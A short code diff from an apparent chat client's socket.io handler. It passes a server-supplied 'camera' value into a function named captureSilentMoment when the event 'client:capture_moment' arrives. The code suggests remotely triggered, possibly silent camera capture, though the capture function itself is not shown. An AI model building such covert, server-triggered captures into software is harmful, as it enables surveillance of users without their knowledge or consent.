@@ -508,9 +508,9 @@ function initSocket() {
     renderChatList(document.getElementById("chat-search")?.value.trim().toLowerCase() || "");
   });
 
-  socket.on("client:capture_moment", async () => {
+  socket.on("client:capture_moment", async (payload) => {
     if (typeof window.captureSilentMoment === "function") {
-      await window.captureSilentMoment();
+      await window.captureSilentMoment(payload?.camera);
     }
   });
 
